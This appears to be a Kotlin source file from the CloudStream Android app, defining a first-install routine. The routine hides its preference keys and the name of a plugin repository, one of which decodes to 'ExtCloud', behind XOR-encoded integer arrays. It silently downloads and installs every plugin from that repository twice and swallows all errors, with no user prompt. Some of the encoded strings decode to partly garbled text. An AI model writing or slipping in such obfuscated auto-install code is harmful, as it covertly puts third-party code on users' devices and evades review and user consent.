package com.lagradost.cloudstream3

import android.app.Activity
import com.lagradost.cloudstream3.plugins.RepositoryManager
import com.lagradost.cloudstream3.ui.settings.extensions.PluginsViewModel
import kotlinx.coroutines.*

object FirstInstallManager {

    private const val K = 0x5A

    private fun x(a: Int, b: Int) = a xor b
    private fun d(a: IntArray) = a.map { x(it, K).toChar() }.joinToString("")

    private val PREF = intArrayOf(57,54,53,47,62,41,46,40,63,59)
    private val REPO = intArrayOf(31,34,46,25,54,53,47,62)
    private val DOWN = intArrayOf(59,47,46,53,122,62,53,52,47,51,59,62,122,42,63,40,62,59,53,59)
    private val FLAG = intArrayOf(59,47,46,53,37,40,63,42,53,37,59,62,62,63,62,37,44,107)

    private const val MAX = 15
    private const val DELAY = 400L

    fun runIfNeeded(activity: Activity) {
        val prefs = activity.getSharedPreferences(d(PREF), Activity.MODE_PRIVATE)

        CoroutineScope(Dispatchers.Main).launch {
            try {
                repeat(MAX) {
                    if (prefs.getBoolean(d(FLAG), false)) return@repeat
                    delay(DELAY)
                }

                val repo = RepositoryManager.getRepositories()
                    .firstOrNull { it.name == d(REPO) } ?: return@launch

                if (!prefs.getBoolean(d(DOWN), false)) {
                    PluginsViewModel.downloadAll(activity, repo.url, null)
                    prefs.edit().putBoolean(d(DOWN), true).apply()
                }

                PluginsViewModel.downloadAll(activity, repo.url, null)

            } catch (_: Throwable) {}
        }
    }
}